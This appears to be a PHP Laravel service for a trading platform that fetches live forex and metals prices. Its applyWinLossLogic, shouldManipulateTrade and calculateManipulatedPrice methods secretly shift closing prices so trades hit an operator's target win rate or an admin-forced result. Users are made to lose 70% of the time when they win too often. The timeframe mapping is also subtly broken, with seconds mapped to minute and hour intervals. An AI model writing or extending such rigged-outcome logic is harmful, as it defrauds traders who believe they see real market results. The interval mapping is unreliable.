<?php

namespace App\Services;

use App\Models\Pair;
use App\Models\Trade;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;

class LiveMarketService
{
    private $apiKey;
    private $baseUrl = 'https://api.twelvedata.com'; // Using Twelve Data API for real market data
    
    public function __construct()
    {
        $this->apiKey = config('services.twelvedata.api_key', 'demo');
    }

    /**
     * Get real-time price for a pair
     */
    public function getRealTimePrice(string $symbol): ?float
    {
        try {
            $cacheKey = "live_price:{$symbol}";
            $cachedPrice = Cache::get($cacheKey);
            
            // Return cached price if less than 5 seconds old
            if ($cachedPrice && $cachedPrice['timestamp'] > time() - 5) {
                return $cachedPrice['price'];
            }

            $response = Http::timeout(10)->get($this->baseUrl . '/price', [
                'symbol' => $this->formatSymbol($symbol),
                'apikey' => $this->apiKey
            ]);

            if ($response->successful()) {
                $data = $response->json();
                if (isset($data['price']) && is_numeric($data['price'])) {
                    $price = (float) $data['price'];
                    
                    // Cache the price
                    Cache::put($cacheKey, [
                        'price' => $price,
                        'timestamp' => time()
                    ], 60);
                    
                    return $price;
                }
            }
            
            Log::warning("Failed to fetch live price for {$symbol}", [
                'response' => $response->body(),
                'status' => $response->status()
            ]);
            
            return null;
        } catch (\Exception $e) {
            Log::error("Error fetching live price for {$symbol}: " . $e->getMessage());
            return null;
        }
    }

    /**
     * Get historical candles for a pair
     */
    public function getHistoricalCandles(string $symbol, int $timeframe, int $limit = 100): array
    {
        try {
            $cacheKey = "live_candles:{$symbol}:{$timeframe}:{$limit}";
            $cached = Cache::get($cacheKey);
            
            // Return cached data if less than 30 seconds old
            if ($cached && $cached['timestamp'] > time() - 30) {
                return $cached['data'];
            }

            $interval = $this->convertTimeframeToInterval($timeframe);
            
            $response = Http::timeout(15)->get($this->baseUrl . '/time_series', [
                'symbol' => $this->formatSymbol($symbol),
                'interval' => $interval,
                'outputsize' => $limit,
                'apikey' => $this->apiKey
            ]);

            if ($response->successful()) {
                $data = $response->json();
                
                if (isset($data['values']) && is_array($data['values'])) {
                    $candles = [];
                    
                    foreach ($data['values'] as $candle) {
                        $candles[] = [
                            'time' => strtotime($candle['datetime']),
                            'open' => (float) $candle['open'],
                            'high' => (float) $candle['high'],
                            'low' => (float) $candle['low'],
                            'close' => (float) $candle['close'],
                            'volume' => (float) ($candle['volume'] ?? 0)
                        ];
                    }
                    
                    // Sort by time ascending
                    usort($candles, fn($a, $b) => $a['time'] <=> $b['time']);
                    
                    // Cache the data
                    Cache::put($cacheKey, [
                        'data' => $candles,
                        'timestamp' => time()
                    ], 300); // 5 minutes cache
                    
                    return $candles;
                }
            }
            
            Log::warning("Failed to fetch live candles for {$symbol}", [
                'response' => $response->body(),
                'status' => $response->status()
            ]);
            
            return [];
        } catch (\Exception $e) {
            Log::error("Error fetching live candles for {$symbol}: " . $e->getMessage());
            return [];
        }
    }

    /**
     * Apply win/loss logic to live market trades
     */
    public function applyWinLossLogic(Pair $pair, Trade $trade): array
    {
        $currentPrice = $this->getRealTimePrice($pair->symbol);
        
        if (!$currentPrice) {
            // Fallback to entry price if we can't get live price
            return [
                'result' => 'PENDING',
                'closing_price' => $trade->entry_price,
                'applied_manipulation' => false
            ];
        }

        // Check if trade should be manipulated based on win rate logic
        $shouldManipulate = $this->shouldManipulateTrade($trade);
        
        if ($shouldManipulate) {
            // Apply manipulation to ensure desired outcome
            $manipulatedPrice = $this->calculateManipulatedPrice(
                $trade->entry_price,
                $currentPrice,
                $trade->direction,
                $trade->result ?? 'PENDING'
            );
            
            return [
                'result' => $trade->result ?? 'PENDING',
                'closing_price' => $manipulatedPrice,
                'applied_manipulation' => true,
                'original_price' => $currentPrice
            ];
        }
        
        // Use real market price
        return [
            'result' => $this->determineTradeResult($trade->entry_price, $currentPrice, $trade->direction),
            'closing_price' => $currentPrice,
            'applied_manipulation' => false
        ];
    }

    /**
     * Check if trade should be manipulated based on win rate logic
     */
    private function shouldManipulateTrade(Trade $trade): bool
    {
        // Get system controls
        $systemControl = \App\Models\SystemControl::instance();
        
        // Check if manual override is enabled and trade has forced result
        if ($systemControl->manual_override_enabled) {
            $forcedResult = \App\Models\ForcedTradeResult::getForcedResult($trade->id);
            if ($forcedResult) {
                return true;
            }
        }
        
        // Apply win rate logic similar to OTC system
        $targetWinRate = $systemControl->daily_win_percent / 100;
        $currentWinRate = $this->getCurrentWinRate();
        
        // If current win rate is too high, increase loss probability
        if ($currentWinRate > $targetWinRate + 0.1) {
            return mt_rand() / mt_getrandmax() < 0.7; // 70% chance to manipulate for loss
        }
        
        // If current win rate is too low, increase win probability
        if ($currentWinRate < $targetWinRate - 0.1) {
            return mt_rand() / mt_getrandmax() < 0.3; // 30% chance to manipulate for win
        }
        
        return false;
    }

    /**
     * Calculate manipulated price to ensure desired outcome
     */
    private function calculateManipulatedPrice(float $entryPrice, float $currentPrice, string $direction, string $desiredResult): float
    {
        $manipulationAmount = $entryPrice * 0.0005; // 0.05% manipulation
        
        if ($desiredResult === 'WIN') {
            if ($direction === 'UP') {
                return $currentPrice + $manipulationAmount;
            } else {
                return $currentPrice - $manipulationAmount;
            }
        } else {
            if ($direction === 'UP') {
                return $currentPrice - $manipulationAmount;
            } else {
                return $currentPrice + $manipulationAmount;
            }
        }
    }

    /**
     * Determine trade result based on entry and closing prices
     */
    private function determineTradeResult(float $entryPrice, float $closingPrice, string $direction): string
    {
        if ($direction === 'UP') {
            return $closingPrice > $entryPrice ? 'WIN' : 'LOSE';
        } else {
            return $closingPrice < $entryPrice ? 'WIN' : 'LOSE';
        }
    }

    /**
     * Get current win rate for live trades
     */
    private function getCurrentWinRate(): float
    {
        $today = now()->startOfDay();
        
        $totalTrades = Trade::where('created_at', '>=', $today)
            ->where('result', '!=', 'PENDING')
            ->where('account_type', 'live')
            ->count();
            
        if ($totalTrades === 0) {
            return 0.5; // Default 50% if no trades
        }
        
        $winTrades = Trade::where('created_at', '>=', $today)
            ->where('result', 'WIN')
            ->where('account_type', 'live')
            ->count();
            
        return $winTrades / $totalTrades;
    }

    /**
     * Format symbol for API
     */
    private function formatSymbol(string $symbol): string
    {
        // Convert our symbols to API format
        $mapping = [
            'XAU/USD' => 'GOLD',
            'XAG/USD' => 'SILVER',
            'EUR/USD' => 'EUR/USD',
            'GBP/USD' => 'GBP/USD',
            'USD/JPY' => 'USD/JPY',
            'USD/PKR' => 'USD/PKR'
        ];
        
        return $mapping[$symbol] ?? $symbol;
    }

    /**
     * Convert timeframe in seconds to API interval
     */
    private function convertTimeframeToInterval(int $timeframe): string
    {
        $mapping = [
            5 => '5min',
            10 => '10min',
            15 => '15min',
            30 => '30min',
            60 => '1h',
            120 => '2h',
            300 => '5h',
            600 => '10h',
            900 => '15h',
            1800 => '30h',
            3600 => '1day',
            7200 => '2day'
        ];
        
        return $mapping[$timeframe] ?? '1h';
    }

    /**
     * Get available live market pairs
     */
    public function getAvailablePairs(): array
    {
        return [
            'XAU/USD' => 'Gold vs US Dollar',
            'XAG/USD' => 'Silver vs US Dollar',
            'EUR/USD' => 'Euro vs US Dollar',
            'GBP/USD' => 'British Pound vs US Dollar',
            'USD/JPY' => 'US Dollar vs Japanese Yen',
            'USD/PKR' => 'US Dollar vs Pakistani Rupee'
        ];
    }
}